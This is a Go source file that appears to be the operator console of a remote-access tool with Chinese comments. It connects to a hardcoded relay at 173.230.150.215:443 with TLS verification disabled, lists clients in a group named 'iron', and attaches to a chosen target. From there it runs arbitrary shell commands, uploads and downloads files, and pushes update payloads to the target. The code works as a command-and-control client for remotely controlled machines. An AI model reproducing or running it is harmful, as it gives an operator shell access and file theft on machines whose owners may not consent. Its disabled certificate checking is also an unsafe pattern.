package main

import (
	T "./tcenter"
	S "./ssl"
	"flag"
	"github.com/op/go-logging"
	"os"
	"time"
	"bufio"
	"strings"
	"crypto/tls"
	"fmt"
)


var connectString = "173.230.150.215:443"
var groupID = "iron"

func LinkClient(cliendID string) error  {
	// init log config
	//format := logging.MustStringFormatter(`%{time:15:04:05.000} > %{message}`)
	format := logging.MustStringFormatter(`%{message}`)
	backend2 := logging.NewLogBackend(os.Stderr, "", 0)
	backend2Formatter := logging.NewBackendFormatter(backend2, format)
	logging.SetBackend(backend2Formatter)

	// 日志文件
	logFilename := fmt.Sprintf("data\\%s\\%s.log", cliendID, time.Now().Format("20060102"))
	logFile, err := os.OpenFile(logFilename, os.O_WRONLY|os.O_APPEND|os.O_CREATE,0666)
	format = logging.MustStringFormatter(`%{time:15:04:05.000} > %{message}`)
	backend1 := logging.NewLogBackend(logFile, "", 0)
	backend1Formatter := logging.NewBackendFormatter(backend1, format)
	backend1Leveled := logging.AddModuleLevel(backend1)
	backend1Leveled.SetLevel(logging.INFO, "")
	logging.SetBackend(backend1Formatter, backend2Formatter)

	// 启动客户端
	wscenter := T.WSClient{}

	// init ssl
	cert, err := S.ClientCert()
	wscenter.TLSClientConfig = &tls.Config{
		InsecureSkipVerify: true,
		Certificates:       []tls.Certificate{cert},
	}

	// connect wscenter
	err = wscenter.Dial(connectString)
	if err != nil {
		println("link error", err.Error())
	}

	// connect target
	wscenter.Connect(cliendID)

	// 等待用户输入
	for {
		inputReader := bufio.NewReader(os.Stdin)
		input, _ := inputReader.ReadString('\n')
		inputString := strings.Trim(input, "\r\n")

		// 判断命令
		s := strings.Split(inputString, " ")
		if s[0] == "put" {
			if len(s) != 3 {
				println("usage: put local_file remote_file")
			} else {
				err := wscenter.SendUploadFile(s[1], s[2])
				if err != nil {
					println(err.Error())
				}
			}
		} else if s[0] == "get" {
			if len(s) != 2 {
				println("usage: get remote_file")
			} else {
				err := wscenter.SendDownloadFile(s[1])
				if err != nil {
					println(err.Error())
				}
			}
		} else if s[0] == "exit" {
			wscenter.SendExit(nil)
			return nil
		} else {
			wscenter.SendShell(inputString+"\n")
		}
	}
}

func ListClient()  {
	// 用户列表
	directory := &T.DirectoryCenter{}

	// init ssl
	cert, err := S.ClientCert()
	directory.TLSClientConfig = &tls.Config{
		InsecureSkipVerify: true,
		Certificates:       []tls.Certificate{cert},
	}

	// connect wscenter
	err = directory.Dial(connectString)
	if err != nil {
		println("link Error", err.Error())
		os.Exit(0)
	}
	directory.Listen()
	directory.GetList(groupID)

	time.Sleep(time.Duration(10) * time.Second)
}

func UpdateClient(clientID string, localFilename string)  {
	// 启动客户端
	wsFile := T.WSFile{}

	// init ssl
	cert, err := S.ClientCert()
	wsFile.TLSClientConfig = &tls.Config{
		InsecureSkipVerify: true,
		Certificates:       []tls.Certificate{cert},
	}

	// connect wscenter
	err = wsFile.Dial(connectString)
	if err != nil {
		println("link error", err.Error())
	}

	// connect target
	wsFile.Connect(clientID)

	if err := wsFile.SendUploadFile(localFilename, "update/update.dat"); err != nil {
		println(err.Error())
	}
	println("updata ok")
	wsFile.SendExit(nil)

	//time.Sleep(time.Duration(1)*time.Minute)
}

func main() {
	println("#####################################")
	println("## WSClient", T.DefaultVersion)
	println("#####################################")
	println("")

	// 获取用户参数
	var help = flag.Bool("h", false, "help")
	var list = flag.Bool("l", false, "list client(s)")
	var id = flag.String("id", "", "target id")
	var updateId = flag.String("u", "", "update client")
	var localFile = flag.String("f", "", "local file")
	flag.Parse()

	if *help {
		// 帮助信息
		flag.PrintDefaults()
	} else  if *list {
		// 客户端列表
		ListClient()
	} else if *id != "" {
		// 连接客户端
		LinkClient(*id)
	} else if *updateId != "" {
		// 更新客户端
		UpdateClient(*updateId, *localFile)
	}

}